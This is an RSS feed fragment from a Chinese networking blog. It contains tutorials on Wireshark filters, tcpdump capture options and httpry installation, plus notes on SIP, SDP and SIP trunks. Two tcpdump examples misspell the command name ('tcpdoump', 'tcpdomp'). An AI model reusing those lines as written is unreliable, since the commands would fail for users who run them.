&lt;li&gt;not 所有条件都不能为真&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip.addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 192.168.2.4 and tcp.port &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2145&lt;/span&gt; and !tcp.port &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3389&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;6-只关心某些特殊的tcp包&#34;&gt;6. 只关心某些特殊的tcp包&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp.flags.fin&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;  只过滤关闭连接的包
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp.flags.syn&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;1	只过滤建立连接的包
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp.flags.reset&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 只过滤出tcp连接重置的包
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;7-统计模块&#34;&gt;7. 统计模块&lt;/h1&gt;
&lt;h2 id=&#34;71-查看有哪些ip&#34;&gt;7.1. 查看有哪些IP&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Statistics -&amp;gt; endpoints&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tcpdump抓包教程</title>
      <link>https://wdd.js.org/network/tcpdump/</link>
      <pubDate>Tue, 25 Oct 2022 09:09:05 +0800</pubDate>
      <guid>https://wdd.js.org/network/tcpdump/</guid>
      <description>&lt;h1 id=&#34;查看帮助文档&#34;&gt;查看帮助文档&lt;/h1&gt;
&lt;p&gt;从帮助文档可以看出，包过滤的表达式一定要放在最后一个参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       tcpdump &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -AbdDefhHIJKlLnNOpqStuUvxX# &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -B buffer_size &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -c count &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --count &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -C file_size &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -E spi@ipaddr algo:secret,...  &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -F file &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -G rotate_seconds &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -i interface &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --immediate-mode &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -j tstamp_type &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -m module &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -M secret &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --number &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --print &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -Q in|out|inout &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -r file &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -s snaplen &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -T type &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --version &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -V file &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -w file &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -W filecount &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -y datalinktype &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -z postrotate-command &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -Z user &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --time-stamp-precision&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;tstamp_precision &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --micro &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; --nano &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; expression &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;列出所有网卡&#34;&gt;列出所有网卡&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -D
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1.enp89s0 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Up, Running, Connected&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2.docker0 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Up, Running, Connected&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3.vetha051ecc &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Up, Running, Connected&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;4.vethe67e03a &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Up, Running, Connected&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5.vethc58c174 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Up, Running, Connected&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;指定网卡--i&#34;&gt;指定网卡 -i&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -i eth0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;所有网卡&#34;&gt;所有网卡&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -i any
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;不要域名解析&#34;&gt;不要域名解析&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -n -i any
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;指定主机&#34;&gt;指定主机&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdoump host 192.168.0.1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;指定源ip或者目标ip&#34;&gt;指定源IP或者目标IP&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 根据源IP过滤
tcpdump src 192.168.3.2

# 根据目标IP过滤
tcpdump dst 192.168.3.2
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;指定协议过滤&#34;&gt;指定协议过滤&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump tcp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;指定端口&#34;&gt;指定端口&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 根据某个端口过滤&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdomp port &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 根据源端口或者目标端口过滤&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump dst port &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump src port &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 根据端口范围过滤&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump portrange 30-90
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;根据ip和地址&#34;&gt;根据IP和地址&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -i ens33 tcp and host 192.168.40.30
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;抓包结果写文件&#34;&gt;抓包结果写文件&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -i ens33 tcp and host 192.168.40.30 -w log.pcap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;每隔30秒写一个文件&#34;&gt;每隔30秒写一个文件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-G 30&lt;/code&gt; 表示每隔30秒写一个文件&lt;/li&gt;
&lt;li&gt;文件名中的%实际上是时间格式&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -i ens33 -G &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; tcp and host 192.168.40.30 -w %Y_%m%d_%H%M_%S.log.pcap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;每达到30mb产生一个文件&#34;&gt;每达到30MB产生一个文件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-C 30&lt;/code&gt; 每达到30MB产生一个文件&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump -i ens33 -C &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; tcp and host 192.168.40.30 -w log.pcap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;指定抓包的个数&#34;&gt;指定抓包的个数&lt;/h1&gt;
&lt;p&gt;在流量很大的网络上抓包，如果写文件的话，很可能将磁盘写满。所以最好指定一个最大的抓包个数，在达到包的个数后，自动退出。&lt;/p&gt;</description>
    </item>
    <item>
      <title>http抓包工具httpry使用</title>
      <link>https://wdd.js.org/network/httpry/</link>
      <pubDate>Tue, 25 Oct 2022 09:07:04 +0800</pubDate>
      <guid>https://wdd.js.org/network/httpry/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://gitee.com/nuannuande/httpry.git
cd httpry
yum install libpcap-devel -y
make
make install
cp -f httpry /usr/sbin/
httpry -i eth0
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>SIP和SDP的关系</title>
      <link>https://wdd.js.org/opensips/ch1/sip-with-sdp/</link>
      <pubDate>Sat, 03 Sep 2022 20:36:45 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-with-sdp/</guid>
      <description>&lt;h1 id=&#34;1-什么是sdp&#34;&gt;1. 什么是SDP?&lt;/h1&gt;
&lt;p&gt;SDP是Session Description Protocol的缩写，翻译过来就是会话描述协议，这个协议通常存储各种和媒体相关的信息，例如支持哪些媒体编码, 媒体端口是多少？媒体IP地址是多少之类的。&lt;/p&gt;
&lt;p&gt;SDP一般作为SIP消息的body部分。如下所示&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;INVITE sip:bob@biloxi.example.com SIP/2.0
Via: SIP/2.0/TCP client.atlanta.example.com:5060;branch=z9hG4bK74bf9
Max-Forwards: 70
From: Alice &amp;lt;sip:alice@atlanta.example.com&amp;gt;;tag=9fxced76sl
To: Bob &amp;lt;sip:bob@biloxi.example.com&amp;gt;
Call-ID: 3848276298220188511@atlanta.example.com
CSeq: 1 INVITE
Contact: &amp;lt;sip:alice@client.atlanta.example.com;transport=tcp&amp;gt;
Content-Type: application/sdp
Content-Length: 151

v=0
o=alice 2890844526 2890844526 IN IP4 client.atlanta.example.com
s=-
c=IN IP4 192.0.2.101
t=0 0
m=audio 49172 RTP/AVP 0
a=rtpmap:0 PCMU/8000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;刚开始我一直认为某些sip消息一定带有sdp，例如invite消息。某些sip请求一定没有携带sdp。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实际上sip消息和sdp并没有硬性的附属关系&lt;/strong&gt;。sip是用来传输信令的，sdp是用来描述媒体流信息的。&lt;/p&gt;
&lt;p&gt;如果信令不需要携带媒体流信息，就可以不用携带sdp。&lt;/p&gt;
&lt;p&gt;一般情况下，invite请求都会带有sdp信息，但是某些时候也会没有。例如3PCC(third party call control), 第三方呼叫控制，是指由第三方负责协商媒体信息。&lt;/p&gt;
&lt;p&gt;常见的一个场景&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-with-sdp/2022-09-03-20-39-11.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-sdp字段介绍&#34;&gt;2. SDP字段介绍&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-with-sdp/2022-09-03-20-51-47.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;21-v-版本号&#34;&gt;2.1. v= 版本号&lt;/h2&gt;
&lt;p&gt;当前sdp的版本号是0，所以常见的都是v=0&lt;/p&gt;
&lt;h2 id=&#34;22-o-发起者id&#34;&gt;2.2. o= 发起者id&lt;/h2&gt;
&lt;p&gt;o=的格式&lt;/p&gt;</description>
    </item>
    <item>
      <title>SIP协议拾遗补缺</title>
      <link>https://wdd.js.org/opensips/ch1/sip-notes/</link>
      <pubDate>Sat, 03 Sep 2022 15:54:57 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/sip-notes/</guid>
      <description>&lt;h1 id=&#34;1-sip协议由request-uri路由而不是to字段&#34;&gt;1. sip协议由request-uri路由，而不是to字段&lt;/h1&gt;
&lt;p&gt;sip消息再经过ua发送出去时，request-uri可能会被重写，而to字段，一般是不变的&lt;/p&gt;
&lt;h1 id=&#34;2-主叫生成callid和from-tag-响应to-tag由另一方生成&#34;&gt;2. 主叫生成callId和from tag, 响应to tag由另一方生成&lt;/h1&gt;
&lt;p&gt;totag的作用可以用来区分初始化请求和序列化请求&lt;/p&gt;
&lt;h1 id=&#34;3-sip消息有哪些头字段是必须的&#34;&gt;3. sip消息有哪些头字段是必须的？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Via&lt;/li&gt;
&lt;li&gt;Max-Forwards (请求消息必须有这个头，响应消息一般没有这个头) 感谢 @genmzy 提示。&lt;/li&gt;
&lt;li&gt;From&lt;/li&gt;
&lt;li&gt;To&lt;/li&gt;
&lt;li&gt;Call-ID&lt;/li&gt;
&lt;li&gt;CSeq&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-被叫在向主叫发消息时from和to字段为什么没变&#34;&gt;4. 被叫在向主叫发消息时，from和to字段为什么没变？&lt;/h1&gt;
&lt;p&gt;from和to字段用来表名sip 请求的方向，而不是sip消息的方向。主叫发起的请求，那么在这个dialog中，所有的sip消息，主叫和被叫字段都不会变。&lt;/p&gt;
&lt;h1 id=&#34;5-为什么所有via头中的branch都以z9hg4bk开头&#34;&gt;5. 为什么所有via头中的branch都以z9hG4bK开头&lt;/h1&gt;
&lt;p&gt;这个头是rfc3261中规定的，表示她是经过严格规则生成的，可以用来标记事务。&lt;/p&gt;
&lt;h1 id=&#34;6-sip有两种url-是什么有什么区别&#34;&gt;6. sip有两种url, 是什么？有什么区别&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用户uri: AOR address of record,  例如from和to字段中的url&lt;/li&gt;
&lt;li&gt;设备uri: 例如 contact头&lt;/li&gt;
&lt;li&gt;用户uri用来唯一认证用户，设备uri用来唯一认证设备。&lt;/li&gt;
&lt;li&gt;用户uri往往需要查询数据库，而设备uri来自设备自己的网络地址，不需要查询数据库。&lt;/li&gt;
&lt;li&gt;一个用户可能有多个设备&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;7-sip注册实际上绑定用户url和设备ip地址&#34;&gt;7. sip注册实际上绑定用户url和设备ip地址&lt;/h1&gt;
&lt;p&gt;我并不能直接联系你，我只能用我的手机拨打你的手机。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-notes/2022-09-03-15-59-59.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;8-呼叫结束了为什么呼叫的状态信息还需要维持一段时间&#34;&gt;8. 呼叫结束了，为什么呼叫的状态信息还需要维持一段时间？&lt;/h1&gt;
&lt;p&gt;重传的invite消息，可能包含相同的callI和cseq, 为了影响到之后的呼叫，需要耗尽网络中重传的包。&lt;/p&gt;
&lt;h1 id=&#34;9-sip-网关是干什么的&#34;&gt;9. sip 网关是干什么的？&lt;/h1&gt;
&lt;p&gt;网关的两侧通信协议是不同的，网关负责将协议翻译成彼此可以理解的协议。sip网关也是如此。电话网络的通信协议不仅仅只有sip， 还有其他的各种信令，如七号信令，ISDN, ISUP, CAS等。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-notes/2022-09-03-16-02-50.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;10-sip结构组件&#34;&gt;10. sip结构组件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;SIP User Agents&lt;/li&gt;
&lt;li&gt;Presence Agents&lt;/li&gt;
&lt;li&gt;B2B User Agents&lt;/li&gt;
&lt;li&gt;SIp Gateways&lt;/li&gt;
&lt;li&gt;SIP Server&lt;/li&gt;
&lt;li&gt;代理服务器&lt;/li&gt;
&lt;li&gt;注册服务器&lt;/li&gt;
&lt;li&gt;重定向服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;11-代理服务器和ua与网关的区别&#34;&gt;11. 代理服务器和UA与网关的区别？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;代理服务器没有媒体处理能力&lt;/li&gt;
&lt;li&gt;代理服务器不解析消息体，只解析消息头&lt;/li&gt;
&lt;li&gt;代理服务器并不分发消息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-notes/2022-09-03-16-04-11.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Trunk Pbx Gateway</title>
      <link>https://wdd.js.org/opensips/ch1/trunk-pbx-gateway/</link>
      <pubDate>Sat, 03 Sep 2022 15:24:44 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/trunk-pbx-gateway/</guid>
      <description>&lt;h1 id=&#34;传统中继&#34;&gt;传统中继&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/trunk-pbx-gateway/2022-09-03-15-26-11.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;sip-trunk中继&#34;&gt;sip trunk中继&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/trunk-pbx-gateway/2022-09-03-15-26-19.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;安全可靠&lt;/strong&gt;：SIP Trunk设备和ITSP之间只需建立唯一的、安全的、具有QoS保证的SIP Trunk链路。通过该链路来承载企业的多路并发呼叫，运营商只需对该链路进行鉴权，不再对承载于该链路上的每一路SIP呼叫进行鉴权。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;节约硬件成本&lt;/strong&gt;：企业内部通信由企业IP-PBX负责。企业所有外出通信都通过SIP Trunk交由ITSP，再由ITSP中的设备发送到PSTN网络，企业不再需要维护原有的传统PSTN中继链路，节省了硬件和维护成本。&lt;/li&gt;
